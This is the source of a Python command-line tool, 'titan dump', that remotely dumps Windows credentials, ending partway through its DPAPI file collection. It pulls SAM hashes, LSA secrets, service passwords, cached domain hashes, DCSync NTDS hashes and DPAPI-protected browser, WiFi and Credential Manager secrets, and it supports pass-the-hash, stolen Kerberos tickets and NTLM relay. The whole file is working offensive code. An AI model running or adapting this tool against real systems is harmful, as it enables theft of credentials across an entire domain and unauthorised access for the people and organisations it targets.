#!/usr/bin/env python3
"""
titan dump — secretsdump-style credential dumping via Titanis

Dumps SAM hashes, LSA secrets, cached domain credentials (DCC2), and
NTDS domain hashes (DCSync) from remote Windows hosts using Titanis
Reg, Dsrep, and Ldap binaries.

Also supports DPAPI credential dumping (Chrome, Edge, Credential Manager)
using Titanis Smb2Client for file collection and built-in crypto for decryption.

Remote Registry is started automatically if stopped/disabled and restored to
its original state on completion.

Usage:
    titan dump DOMAIN/user:'password'@192.168.1.10
    titan dump -u user -d domain -p password -t 192.168.1.10
    titan dump -u user -d domain --hash <NT> -t host
    titan dump -u user -d domain -hashes <NT> -t host

  Kerberos / ccache (RBCD, S4U2Proxy, etc.):
    KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t host
    titan dump -k --ccache Administrator.ccache -t host
    titan dump -u user -d domain --aes-key <hex> -dc-ip dc01.domain.local -t host

  SMB relay / ntlmrelayx --socks:
    proxychains titan dump -u administrator -d DOMAIN --no-pass -t 192.168.1.10
    proxychains titan dump -u administrator -d DOMAIN --no-pass --ntds -t dc01.domain.local

  Bulk / output:
    titan dump -u user -d domain -p password -f hosts.txt -o /path/to/loot/
    titan dump -u user -d domain -p password -dc-ip dc01.domain.local --ntds -t dc01
    titan dump -u user -d domain -p password -dc-ip dc01 -just-dc-user Administrator -t dc01
    titan dump -u Administrator -d CORP -p pass --dpapi -t 192.168.1.10
"""

import argparse
import base64
import csv
import hashlib
import hmac
import io
import json
import os
import re
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

from titanlib.common import find_binary, make_env, run as _common_run


def _md4(data: bytes) -> str:
    """MD4 hex digest — falls back through multiple providers on OpenSSL 3.x."""
    try:
        return hashlib.new('md4', data).hexdigest()
    except ValueError:
        pass
    try:
        from impacket.crypto import MD4
        return MD4.new(data).hexdigest()
    except Exception:
        pass
    try:
        from Cryptodome.Hash import MD4
        return MD4.new(data).hexdigest()
    except Exception:
        pass
    from Crypto.Hash import MD4
    return MD4.new(data).hexdigest()

try:
    from impacket.dpapi import MasterKeyFile as _MKFile, MasterKey as _MK, DPAPI_BLOB as _DBlob
    _HAS_IMPACKET_DPAPI = True
except ImportError:
    _HAS_IMPACKET_DPAPI = False

# Titanis binary paths — resolved once at import time
REG_BIN   = find_binary('Reg')
DSREP_BIN = find_binary('Dsrep')
LDAP_BIN  = find_binary('Ldap')
SMB_BIN   = find_binary('Smb2Client')
WMI_BIN   = find_binary('Wmi')

EMPTY_LM = 'aad3b435b51404eeaad3b435b51404ee'
EMPTY_NT = '31d6cfe0d16ae931b73c59d7e0c089c0'

_CALG_3DES    = 0x6603
_CALG_AES_256 = 0x6610
_CALG_SHA1    = 0x8004
_CALG_SHA_512 = 0x800E

_BUILTIN_ACCOUNTS = {
    'localsystem', 'localservice', 'networkservice',
    'nt authority\\localsystem', 'nt authority\\localservice',
    'nt authority\\networkservice',
}


# ── Argument parsing ──────────────────────────────────────────────────────────

def _ccache_principal(args):
    """Extract username, realm, ticket validity from ccache; fill args if missing."""
    path = args.ticket_cache or getattr(args, 'tgt', None)
    if not path:
        return
    try:
        from impacket.krb5.ccache import CCache
        from datetime import datetime, timezone
        cc = CCache.loadFile(path)
        principal = cc.principal
        if not args.username and principal.components:
            args.username = principal.components[0]['data'].decode()
        if not args.domain and principal.realm:
            args.domain = principal.realm['data'].decode()
        print(f'[*] ccache principal: {args.username}@{args.domain}', file=sys.stderr)
        if cc.credentials:
            t = cc.credentials[0]['time']
            start_ts = t['starttime'] or t['authtime']
            end_ts   = t['endtime']
            now      = datetime.now(tz=timezone.utc)
            if start_ts:
                start_dt = datetime.fromtimestamp(start_ts, tz=timezone.utc)
                print(f'[*] ticket issued:  {start_dt.strftime("%Y-%m-%d %H:%M:%S UTC")}',
                      file=sys.stderr)
            if end_ts:
                end_dt  = datetime.fromtimestamp(end_ts, tz=timezone.utc)
                ttl     = end_dt - now
                expired = ttl.total_seconds() < 0
                ttl_str = ('EXPIRED' if expired
                           else f'expires in {int(ttl.total_seconds() // 3600)}h'
                                f'{int((ttl.total_seconds() % 3600) // 60)}m')
                print(f'[*] ticket expiry:  {end_dt.strftime("%Y-%m-%d %H:%M:%S UTC")} ({ttl_str})',
                      file=sys.stderr)
    except Exception:
        pass


def _parse_target_string(s):
    at = s.rfind('@')
    if at >= 0:
        host   = s[at + 1:]
        prefix = s[:at]
    else:
        # No @host — treat as credentials-only (host comes from -t / -f)
        # if the string looks like domain/user:pass or user:pass.
        # A bare hostname has no / or : so falls through to return None.
        if '/' not in s and ':' not in s:
            return None
        host   = None
        prefix = s
    m = re.match(r'^(?:(?P<domain>[^/]+)/)?(?P<user>[^:]+)(?::(?P<password>.*))?$', prefix)
    if not m:
        return None
    return m.group('domain'), m.group('user'), m.group('password'), host


def parse_args():
    p = argparse.ArgumentParser(
        prog='titan dump',
        description='titan dump — secretsdump-style credential dump via Titanis',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split('\n\n', 1)[1])

    p.add_argument('target_string', nargs='?', metavar='[[domain/]user[:pass]@]host',
                   help='impacket-style target string (alternative to -u/-d/-p/-t)')

    auth = p.add_argument_group('Authentication')
    auth.add_argument('-u', '--username', metavar='USER')
    auth.add_argument('-d', '--domain', metavar='DOMAIN', default='',
                      help='Domain name (optional — omit for local account auth)')

    cred = auth.add_mutually_exclusive_group()
    cred.add_argument('-p', '--password', metavar='PASS')
    cred.add_argument('--hash', '-hashes', metavar='[LM:]NT', dest='ntlm_hash',
                      help='NTLM hash for pass-the-hash (LM:NT or just NT). '
                           '-hashes is the impacket-style alias.')
    cred.add_argument('--no-pass', '-no-pass', action='store_true', dest='no_pass',
                      help='No password / empty credential. Use with proxychains for '
                           'ntlmrelayx --socks relay sessions.')

    kerb = p.add_argument_group('Kerberos')
    kerb.add_argument('-k', '--kerberos', action='store_true',
                      help='Use Kerberos auth. Auto-reads KRB5CCNAME env var. '
                           'Combine with --ccache to override.')
    kerb.add_argument('-K', '--kdc', '-dc-ip', metavar='HOST[:PORT]', dest='kdc',
                      help='KDC / domain controller. -dc-ip is the impacket-style alias.')
    kerb.add_argument('--aes-key', metavar='HEX', help='AES-128/-256 key for Kerberos auth')
    kerb.add_argument('--ccache', '--ticket-cache', metavar='FILE', dest='ticket_cache',
                      help='Service ticket ccache (from getST.py/getTGT.py or KRB5CCNAME). '
                           '--ticket-cache is the legacy alias.')
    kerb.add_argument('--tgt', metavar='FILE', help='TGT ccache/kirbi file (legacy; prefer --ccache)')

    tgt = p.add_argument_group('Target')
    tg = tgt.add_mutually_exclusive_group()
    tg.add_argument('-t', '--target', metavar='HOST')
    tg.add_argument('-f', '--file', metavar='HOSTS_FILE', type=argparse.FileType('r'),
                    help='File of hosts (one per line; supports CIDR and dash ranges)')

    what = p.add_argument_group(
        'What to dump',
        'Default (no flags): SAM + LSA. Use -A/--all or combine flags as needed.')
    what.add_argument('-A', '--all', '--dump-everything', action='store_true', dest='dump_everything',
                      help='SAM + LSA + DCC2 + DPAPI. -A is the short form.')
    what.add_argument('--sam',   action='store_true', help='Dump SAM hashes')
    what.add_argument('--lsa',   action='store_true', help='Dump LSA secrets + service creds')
    what.add_argument('--cache', action='store_true', help='Dump DCC2 cached domain credentials')
    what.add_argument('--dpapi', action='store_true',
                      help='Dump DPAPI credentials (Chrome/Edge/Brave passwords+cookies, '
                           'WiFi PSKs, Azure WAM tokens, RDCMan creds, CredMan, SCCM) '
                           'via Smb2Client + WMI — no LSASS touch')
    # Legacy skip flags (kept for backwards compat)
    what.add_argument('--no-sam',   action='store_true', help=argparse.SUPPRESS)
    what.add_argument('--no-lsa',   action='store_true', help=argparse.SUPPRESS)
    what.add_argument('--no-cache', action='store_true', help=argparse.SUPPRESS)

    p.add_argument('--ntds', action='store_true',
                   help='DCSync — dump NTDS via MS-DRSR (use -dc-ip/-K to specify DC)')
    p.add_argument('-just-dc-user', '--just-dc-user', metavar='USER', dest='just_dc_user',
                   help='DCSync only this user (implies --ntds). -just-dc-user is impacket-style.')
    p.add_argument('--backupkey', action='store_true',
                   help='Extract DPAPI domain backup key from DC (saves PEM for --dpapi-backupkey)')
    p.add_argument('--backupkey-out', metavar='FILE', help=argparse.SUPPRESS)
    p.add_argument('--dpapi-backupkey', metavar='FILE', help=argparse.SUPPRESS)
    p.add_argument('--dpapi-no-system', action='store_true', help=argparse.SUPPRESS)
    p.add_argument('--just-dc-ntlm', action='store_true', help=argparse.SUPPRESS)
    p.add_argument('--no-dn', action='store_true', help=argparse.SUPPRESS)

    p.add_argument('-o', '--output', '--output-dir', metavar='DIR', default=None,
                   dest='output_dir',
                   help='Write output files here (-o is the short form)')
    p.add_argument('-j', '--threads', metavar='N', type=int, default=1,
                   help='Parallel threads for -f multi-host mode (default: 1)')
    p.add_argument('--timeout', metavar='SEC', type=float, default=3,
                   help='TCP connect timeout in seconds (default: 3)')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    if args.target_string:
        parsed = _parse_target_string(args.target_string)
        if parsed:
            dom, usr, pw, host = parsed
            if dom and not args.domain:    args.domain   = dom
            if usr and not args.username:  args.username = usr
            if pw is not None and not args.password and not args.ntlm_hash:
                args.password = pw
            if host and not args.target:   args.target   = host
        elif not args.target and '@' not in args.target_string:
            # Bare hostname (no / or : ) — use as target directly
            args.target = args.target_string

    if args.just_dc_ntlm or args.just_dc_user:
        args.ntds = True

    if args.dump_everything:
        args.sam   = True
        args.lsa   = True
        args.cache = True
        args.dpapi = True

    if not args.ntds and not any([args.sam, args.lsa, args.cache, args.dpapi]):
        args.sam = True
        args.lsa = True

    if args.no_sam:   args.sam   = False
    if args.no_lsa:   args.lsa   = False
    if args.no_cache: args.cache = False

    if not (args.target or args.file):
        p.error('target is required (-t, -f, or target string)')

    if args.kerberos and not args.ticket_cache and not args.tgt:
        env_ccache = os.environ.get('KRB5CCNAME', '')
        if env_ccache:
            args.ticket_cache = env_ccache
            print(f'[*] KRB5CCNAME → {env_ccache}', file=sys.stderr)
        else:
            p.error('-k/--kerberos requires KRB5CCNAME to be set or --ccache to be given')

    if args.kerberos and args.ticket_cache and not os.path.isfile(args.ticket_cache):
        p.error(f'ccache file not found: {args.ticket_cache}\n'
                f'  Run getST.py -spn cifs/<target> ... to obtain a service ticket')

    if args.kerberos and args.ticket_cache and (not args.username or not args.domain):
        _ccache_principal(args)
    if not args.username and not args.kerberos:
        p.error('username is required (-u or target string)')

    has_cred = (args.password or args.ntlm_hash or args.aes_key or
                args.tgt or args.ticket_cache or args.no_pass)
    if not has_cred:
        p.error('provide one of: -p/--password, --hash/-hashes, --aes-key, --ccache/--tgt, '
                '--no-pass (-k sets --ccache from KRB5CCNAME)')

    if args.ntlm_hash and ':' in args.ntlm_hash:
        args.ntlm_hash = args.ntlm_hash.split(':', 1)[1]

    return args


def _auth_args(args):
    """Build Titanis binary auth flags from parsed args."""
    a = ['-UserName', args.username or '']
    if args.domain:
        a += ['-UserDomain', args.domain]
    elif not getattr(args, 'kerberos', False):
        a += ['-UserDomain', '.']
    if args.ntlm_hash:
        a += ['-NtlmHash', args.ntlm_hash]
    elif args.password:
        a += ['-Password', args.password]
    elif getattr(args, 'no_pass', False):
        a += ['-NtlmHash', '31d6cfe0d16ae931b73c59d7e0c089c0']  # PtH forces NTLM-only; relay ignores hash
    if args.kdc:           a += ['-Kdc',         args.kdc]
    if args.aes_key:       a += ['-AesKey',       args.aes_key]
    if args.tgt:           a += ['-Tgt',          args.tgt]
    if args.ticket_cache:  a += ['-TicketCache',  args.ticket_cache]
    return a


# ── Subprocess wrappers ───────────────────────────────────────────────────────

def _run(binary, subcmd, auth, extra, verbose=False, timeout=90):
    return _common_run(binary, subcmd, auth, extra, verbose, timeout)

def _reg(subcmd, auth, host, extra, verbose=False, timeout=90):
    return _run(REG_BIN, subcmd, auth, [host] + extra, verbose, timeout)[0]

def _ldap(subcmd, auth, host, extra, verbose=False, timeout=60):
    return _run(LDAP_BIN, subcmd, auth, [host] + extra, verbose, timeout)[0]

def _dsrep(subcmd, auth, extra, verbose=False, timeout=300):
    return _run(DSREP_BIN, subcmd, auth, extra, verbose, timeout)

def _smb(subcmd, auth, extra, verbose=False, timeout=120):
    return _run(SMB_BIN, subcmd, auth, extra, verbose, timeout)


# ── Crypto helpers ────────────────────────────────────────────────────────────

def _aes128_cbc(key, iv, data):
    pad = (16 - len(data) % 16) % 16
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec = c.decryptor()
    return dec.update(data + b'\x00' * pad) + dec.finalize()


def _pad4(n):
    return n + (n & 3) if (n & 3) else n


def _utf16(hex_str):
    try:
        raw = bytes.fromhex(hex_str)
        return raw.decode('utf-16-le').rstrip('\x00')
    except Exception:
        return None


# ── DPAPI crypto — backed by impacket ────────────────────────────────────────

def _guid_bytes_to_str(b: bytes) -> str:
    """16-byte Windows mixed-endian GUID → canonical lowercase string."""
    d1 = struct.unpack_from('<I', b, 0)[0]
    d2 = struct.unpack_from('<H', b, 4)[0]
    d3 = struct.unpack_from('<H', b, 6)[0]
    d4 = b[8:16].hex()
    return f'{d1:08x}-{d2:04x}-{d3:04x}-{d4[:4]}-{d4[4:]}'


def _mk_decrypt_file(data: bytes, key: bytes) -> tuple:
    """Decrypt a Windows masterkey file using impacket.
    Returns (guid_str, masterkey_bytes) or (guid_str, None) on failure."""
    try:
        mkf = _MKFile(data)
        guid_raw = data[12:84]
        guid = guid_raw.decode('utf-16-le').rstrip('\x00').lower()
        mk_len = mkf['MasterKeyLen']
        if mk_len == 0:
            return guid, None
        mk_data = data[len(mkf):len(mkf) + mk_len]
        mk = _MK(mk_data)
        result = mk.decrypt(key)
        return guid, result
    except Exception:
        return '', None


def _derive_user_keys(sid: str, nt_bytes: bytes) -> list:
    """Derive DPAPI masterkey decryption keys from NT hash + user SID.

    Windows encrypts user masterkeys with an HMAC-SHA1-derived key, not
    the raw NT hash.  Protected Users adds a PBKDF2-SHA256 derivation.
    Mirrors dploot's deriveKeysFromUserkey().
    """
    z_sid = (sid + '\0').encode('utf-16-le')
    sid_bytes = sid.encode('utf-16-le')

    key1 = hmac.new(nt_bytes, z_sid, 'sha1').digest()
    keys = [key1]

    if len(nt_bytes) != 20:
        tmp = hashlib.pbkdf2_hmac('sha256', nt_bytes, sid_bytes, 10000)
        tmp2 = hashlib.pbkdf2_hmac('sha256', tmp, sid_bytes, 1)[:16]
        key2 = hmac.new(tmp2, z_sid, 'sha1').digest()[:20]
        keys.insert(0, key2)

    return keys


def _blob_parse(data: bytes) -> dict:
    """Parse a DPAPI blob header for mk_guid (fallback display)."""
    try:
        off = 4 + 16 + 4
        mk_guid = _guid_bytes_to_str(data[off:off + 16])
        return {'mk_guid': mk_guid}
    except Exception:
        return None


def _blob_decrypt(blob_data: bytes, masterkeys: dict) -> bytes:
    """Decrypt a DPAPI blob using impacket's DPAPI_BLOB class."""
    if not _HAS_IMPACKET_DPAPI:
        return None
    try:
        blob = _DBlob(blob_data)
        from binascii import hexlify
        guid_hex = hexlify(blob['GuidMasterKey']).decode()
        guid = (f'{guid_hex[6:8]}{guid_hex[4:6]}{guid_hex[2:4]}{guid_hex[0:2]}-'
                f'{guid_hex[10:12]}{guid_hex[8:10]}-{guid_hex[14:16]}{guid_hex[12:14]}-'
                f'{guid_hex[16:20]}-{guid_hex[20:]}')
        mk = masterkeys.get(guid)
        if not mk:
            return None
        result = blob.decrypt(mk)
        return result
    except Exception:
        return None


# ── SYSKEY ────────────────────────────────────────────────────────────────────

def _syskey_from_output(raw):
    for row in csv.DictReader(io.StringIO(raw)):
        val = row.get('Chars', '').strip().strip('"')
        if len(val) == 32 and all(c in '0123456789abcdefABCDEF' for c in val):
            return val
    for line in raw.splitlines():
        val = line.strip().strip('"')
        if len(val) == 32 and all(c in '0123456789abcdefABCDEF' for c in val):
            return val
    return '(not retrieved)'


# ── SAM hashes ────────────────────────────────────────────────────────────────

def _dump_sam(hostname, raw_csv, out):
    out.append(f'\n[*] SAM Hashes ({hostname})')
    out.append('-' * 60)
    hashes = {}
    for row in csv.DictReader(io.StringIO(raw_csv)):
        user = row.get('AccountName', '').strip()
        rid  = row.get('Rid', '').strip().replace(',', '')
        nt   = (row.get('NtlmHashText', '') or EMPTY_NT).strip()
        if user:
            out.append(f'{user}:{rid}:{EMPTY_LM}:{nt}:::')
            hashes[user.lower()] = nt
    return hashes


# ── DCC2 cache ────────────────────────────────────────────────────────────────

def _decrypt_dcc2(record, nlkm, iters=10240):
    if len(record) < 0x70:
        return None
    user_len       = struct.unpack_from('<H', record, 0x00)[0]
    domain_len     = struct.unpack_from('<H', record, 0x02)[0]
    dns_domain_len = struct.unpack_from('<H', record, 0x3C)[0]
    flags          = struct.unpack_from('<I', record, 0x30)[0]
    if user_len == 0 or not (flags & 1):
        return None
    iv = record[0x40:0x50]
    if iv == b'\x00' * 16:
        return None
    plain = _aes128_cbc(nlkm[:16], iv, record[0x60:])
    dcc1 = plain[:16]
    try:
        username = plain[0x48:0x48 + user_len].decode('utf-16-le').strip('\x00').lower()
    except Exception:
        return None
    if not username:
        return None
    pos = 0x48 + _pad4(user_len) + _pad4(domain_len)
    try:
        dns_domain = (plain[pos:pos + dns_domain_len].decode('utf-16-le').strip('\x00').lower()
                      if dns_domain_len else '')
    except Exception:
        dns_domain = ''
    dcc2 = hashlib.pbkdf2_hmac('sha1', dcc1, username.encode('utf-16-le'), iters, 16)
    return username, dns_domain, dcc2.hex()


def _dump_cache(hostname, raw_csv, nlkm_hex, out):
    if not nlkm_hex:
        return
    nlkm  = bytes.fromhex(nlkm_hex)
    iters = 10240
    for row in csv.DictReader(io.StringIO(raw_csv)):
        if row.get('Name', '').strip() == 'NL$IterationCount':
            try:
                val = int(row.get('Value', '0') or '0')
                iters = (val & 0xfffffc00) if val > 10240 else val * 1024
            except Exception:
                pass
            break
    creds = []
    for row in csv.DictReader(io.StringIO(raw_csv)):
        name    = row.get('Name', '').strip().upper()
        hex_val = row.get('BytesAsHexString', '').strip()
        if not name.startswith('NL$') or name in ('NL$CONTROL', 'NL$KM', 'NL$ITERATIONCOUNT'):
            continue
        if not hex_val or len(hex_val) < 192:
            continue
        try:
            rec = bytes.fromhex(hex_val)
        except ValueError:
            continue
        if len(rec) >= 0x50 and rec[0x40:0x50] == b'\x00' * 16:
            continue
        try:
            result = _decrypt_dcc2(rec, nlkm, iters)
            if result:
                creds.append(result)
        except Exception:
            pass
    if creds:
        out.append(f'\n[*] Cached Domain Credentials ({hostname})')
        out.append(f'    hashcat -m 2100 | john --format=mscash2')
        out.append('-' * 60)
        for username, dns_domain, dcc2_hex in creds:
            prefix = f'{dns_domain}/' if dns_domain else ''
            out.append(f'{prefix}{username}:$DCC2${iters}#{username}#{dcc2_hex}')


# ── Service account resolution ────────────────────────────────────────────────

def _resolve_service_account(svc_name, host, auth, verbose=False):
    key = rf'HKLM\SYSTEM\CurrentControlSet\Services\{svc_name}'
    raw = _reg('list', auth, host,
               ['-BackupSemantics', key, '-IncludeData', '-ConsoleOutputStyle', 'Csv'],
               verbose=verbose)
    if not raw:
        return None
    for row in csv.DictReader(io.StringIO(raw)):
        if row.get('Name', '').strip() == 'ObjectName':
            val = (row.get('Value', '') or '').strip()
            if val and val.lower() not in _BUILTIN_ACCOUNTS:
                return val
    return None


# ── LSA secrets ───────────────────────────────────────────────────────────────

def _dump_lsa(hostname, raw_csv, auth, out, verbose=False):
    """Parse LSA secrets. Returns (nlkm_hex, dpapi_system_hex)."""
    nlkm_hex         = None
    dpapi_system_hex = None
    lsa_lines        = []
    svc_creds        = []

    for row in csv.DictReader(io.StringIO(raw_csv)):
        name = row.get('Name', '').strip()
        cur  = (row.get('CurrentValueHex', '') or '').strip()
        old  = (row.get('OldValueHex',     '') or '').strip()
        if not name:
            continue

        if name == 'NL$KM':
            nlkm_hex = cur

        elif name == 'DPAPI_SYSTEM':
            dpapi_system_hex = cur
            if cur and len(cur) >= 88:
                blob = bytes.fromhex(cur)
                lsa_lines.append('DPAPI_SYSTEM')
                lsa_lines.append(f'  dpapi_machinekey: 0x{blob[4:24].hex()}')
                lsa_lines.append(f'  dpapi_userkey:    0x{blob[24:44].hex()}')

        elif name == '$MACHINE.ACC':
            if cur:
                nt = _md4(bytes.fromhex(cur))
                lsa_lines.append('$MACHINE.ACC')
                lsa_lines.append(f'  {nt}')
            if old and old != cur:
                lsa_lines.append(f'  (old) {_md4(bytes.fromhex(old))}')

        elif name.startswith('_SC_'):
            if not cur:
                continue
            pw     = _utf16(cur) or f'[hex] {cur}'
            pw_old = _utf16(old) if (old and old != cur) else None
            svc    = name[4:]
            acct   = _resolve_service_account(svc, hostname, auth, verbose)
            svc_creds.append((name, svc, acct, pw, pw_old))

        elif name == 'DefaultPassword':
            if cur:
                lsa_lines.append(f'DefaultPassword: {_utf16(cur) or cur}')

        elif name.startswith('L$'):
            pass

        else:
            if cur:
                lsa_lines.append(f'{name}: {cur}')

    if lsa_lines:
        out.append(f'\n[*] LSA Secrets ({hostname})')
        out.append('-' * 60)
        out.extend(lsa_lines)

    if svc_creds:
        out.append(f'\n[*] Service Account Credentials ({hostname})')
        out.append('-' * 60)
        for sc_name, svc, acct, pw, pw_old in svc_creds:
            out.append(sc_name)
            out.append(f'  Account:  {acct or "[unresolved]"}')
            out.append(f'  Password: {pw}')
            if pw_old:
                out.append(f'  (old):    {pw_old}')

    return nlkm_hex, dpapi_system_hex


# ── DCSync via Dsrep ──────────────────────────────────────────────────────────

def _build_domain_map(hostname, auth, verbose=False):
    raw = _ldap('query', auth, hostname,
                ['(|(objectClass=user)(objectClass=computer))',
                 '-OutputFields', 'sAMAccountName,', 'distinguishedName',
                 '-ConsoleOutputStyle', 'Csv'],
                verbose=verbose, timeout=120)
    domain_map = {}
    for row in csv.DictReader(io.StringIO(raw)):
        sam = row.get('sAMAccountName', '').replace('\x00', '').strip()
        dn  = row.get('distinguishedName', '').strip().strip('"')
        if sam and dn:
            parts = [c.strip()[3:] for c in dn.split(',') if c.strip().upper().startswith('DC=')]
            domain = '.'.join(parts)
            if domain:
                domain_map[sam.lower()] = domain
    return domain_map


def _parse_dsrep_json(raw):
    def _b64_to_hex(b64):
        try:
            return base64.b64decode(b64).hex()
        except Exception:
            return ''

    def _history_hashes(entries):
        result = []
        for e in (entries or []):
            h = _b64_to_hex(e.get('Bytes', '') if isinstance(e, dict) else e)
            if len(h) == 32:
                result.append(h)
        return result

    objects = []
    depth, start = 0, None
    for i, c in enumerate(raw):
        if c == '{':
            if depth == 0: start = i
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0 and start is not None:
                try:
                    objects.append(json.loads(raw[start:i + 1]))
                except Exception:
                    pass
                start = None

    results = []
    for obj in objects:
        sam = obj.get('sAMAccountName', '').replace('\x00', '').strip()
        if not sam:
            continue
        pwd = obj.get('unicodePwd')
        if not pwd:
            continue
        nt = _b64_to_hex(pwd.get('Bytes', '') if isinstance(pwd, dict) else pwd)
        if len(nt) != 32:
            continue
        sid_obj = obj.get('objectSid', {})
        rid = sid_obj.get('Rid', '') if isinstance(sid_obj, dict) else ''
        results.append({
            'sam':        sam,
            'rid':        rid,
            'nt':         nt,
            'nt_history': _history_hashes(obj.get('ntPwdHistory', [])),
            'lm_history': _history_hashes(obj.get('lmPwdHistory', [])),
        })
    return results


def _dump_ntds(hostname, args, auth, out, nt_hashes, verbose=False):
    if not DSREP_BIN or not os.path.exists(DSREP_BIN):
        out.append('\n[!] Dsrep binary not found — skipping NTDS/DCSync dump')
        return

    out.append('\n[*] Dumping Domain Credentials (DCSync via Dsrep / MS-DRSR)')
    out.append('-' * 60)

    filter_user     = getattr(args, 'just_dc_user', None)
    fallback_domain = args.domain
    domain_map = {} if getattr(args, 'no_dn', False) else _build_domain_map(hostname, auth, verbose=verbose)

    if filter_user:
        ldap_raw = _ldap('query', auth, hostname,
                         [f'(sAMAccountName={filter_user})', '-ConsoleOutputStyle', 'Csv'],
                         verbose=verbose)
        dns = []
        for row in csv.DictReader(io.StringIO(ldap_raw)):
            dn = row.get('EntryName', '').strip().strip('"')
            if dn:
                dns.append(dn)
        if not dns:
            out.append(f'  (user {filter_user!r} not found via LDAP)')
            return
        target_args = [hostname, dns[0], '-Spnego']
    else:
        target_args = [hostname, '-Spnego']

    raw, _ = _run(DSREP_BIN, 'rep', auth,
                  target_args + [
                      '-OutputFields', 'samAccountName,', 'objectSid,',
                      'unicodePwd,', 'ntPwdHistory,', 'lmPwdHistory',
                      '-ConsoleOutputStyle', 'Json',
                  ],
                  verbose=verbose, timeout=300)

    count, seen = 0, set()
    for obj in _parse_dsrep_json(raw):
        sam = obj['sam']
        if not sam or sam in seen:
            continue
        seen.add(sam)
        rid    = obj['rid']
        nt     = obj['nt']
        domain = domain_map.get(sam.lower(), fallback_domain)
        prefix = f'{domain}\\' if domain else ''
        out.append(f'{prefix}{sam}:{rid}:{EMPTY_LM}:{nt}:::')
        nt_hashes.append(nt)
        count += 1
        for i, h in enumerate(obj['nt_history'][1:], 1):
            out.append(f'{prefix}{sam}_history{i}:{rid}:{EMPTY_LM}:{h}:::')

    if count == 0:
        out.append('  (no hashes extracted — run with -v for details)')


# ── DPAPI: SMB file collection ────────────────────────────────────────────────

def _smb_pull_file(unc: str, dest: str, auth: list, verbose: bool = False) -> bool:
    extra = ['-BackupSemantics', unc, dest]
    _, rc = _smb('get', auth, extra, verbose, timeout=60)
    return rc == 0


def _smb_ls(unc: str, auth: list, depth: int = 0, verbose: bool = False) -> list:
    """List a remote directory. Uses JSON output to avoid dropping hidden/system files."""
    extra = ['-BackupSemantics', '-ConsoleOutputStyle', 'Json', '-Depth', str(depth), unc]
    out, _ = _smb('ls', auth, extra, verbose, timeout=60)
    try:
        cleaned = out.rstrip().rstrip(']') + ']'
        rows = json.loads(cleaned)
        return [(r.get('RelativePath') or '').strip() for r in rows if r.get('RelativePath')]
    except (json.JSONDecodeError, TypeError):
        return []


def _collect_dpapi_files(host: str, auth: list, workdir: str, verbose: bool) -> dict:
    """Pull DPAPI-relevant files from host via Smb2Client into workdir."""
    result = {'sys_mks_root': [], 'sys_mks_user': [], 'user_mks': {}, 'credman': {},
              'chrome': {}, 'edge': {}, 'brave': {}, 'user_sids': {},
              'wifi_profiles': [], 'wam_tokens': {}, 'rdcman': {}}

    _GUID_RE = re.compile(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}'
                          r'-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$', re.I)

    def pull_file(remote_path: str, local_path: str) -> bool:
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        return _smb_pull_file(remote_path, local_path, auth, verbose)

    def ls(unc: str, depth: int = 0) -> list:
        return _smb_ls(unc, auth, depth, verbose)

    def pull_cred_dir(unc_base: str, label: str) -> list:
        paths = []
        for blob_name in ls(unc_base):
            blob_name = blob_name.split('\\')[-1]
            if not blob_name or blob_name in ('.', '..'):
                continue
            local = os.path.join(workdir, 'creds', label, blob_name)
            if pull_file(unc_base + '\\' + blob_name, local):
                paths.append(local)
        return paths

    sys_protect = rf'\\{host}\C$\Windows\System32\Microsoft\Protect\S-1-5-18'
    for entry in ls(sys_protect, depth=1):
        if not entry or entry in ('.', '..', 'BK-S-1-5-18', 'Preferred'):
            continue
        name = entry.split('\\')[-1]
        if _GUID_RE.match(name):
            local = os.path.join(workdir, 'sys_mks', 'root', name)
            if pull_file(sys_protect + '\\' + name, local):
                result['sys_mks_root'].append(local)
        elif name.lower() == 'user':
            for sub in ls(sys_protect + '\\User', depth=0):
                sub_name = sub.split('\\')[-1]
                if _GUID_RE.match(sub_name):
                    local = os.path.join(workdir, 'sys_mks', 'user', sub_name)
                    if pull_file(sys_protect + '\\User\\' + sub_name, local):
                        result['sys_mks_user'].append(local)

    sys_cred_paths = [
        (rf'\\{host}\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials',  'sys_local'),
        (rf'\\{host}\C$\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials', 'sys_roam'),
        (rf'\\{host}\C$\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials',    'lsvc_local'),
        (rf'\\{host}\C$\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials',  'lsvc_roam'),
        (rf'\\{host}\C$\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials',  'nsvc_local'),
    ]
    sys_creds = []
    for unc, label in sys_cred_paths:
        sys_creds.extend(pull_cred_dir(unc, label))
    if sys_creds:
        result['credman']['[SYSTEM]'] = sys_creds

    wifi_base = rf'\\{host}\C$\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
    for iface_entry in ls(wifi_base):
        iface_name = iface_entry.split('\\')[-1]
        if not _GUID_RE.match(iface_name):
            continue
        iface_unc = wifi_base + '\\' + iface_name
        for xml_entry in ls(iface_unc):
            xml_name = xml_entry.split('\\')[-1]
            if not xml_name.lower().endswith('.xml'):
                continue
            local_xml = os.path.join(workdir, 'wifi', iface_name, xml_name)
            if pull_file(iface_unc + '\\' + xml_name, local_xml):
                result['wifi_profiles'].append(local_xml)

    skip_names = {'All Users', 'Default', 'Default User', 'Public', 'desktop.ini', '.', '..'}
    user_names = [n for n in ls(rf'\\{host}\C$\Users') if n and n not in skip_names]

    for username in user_names:
        base = rf'\\{host}\C$\Users\{username}'
        udir = os.path.join(workdir, 'users', username)

        protect_unc = base + r'\AppData\Roaming\Microsoft\Protect'
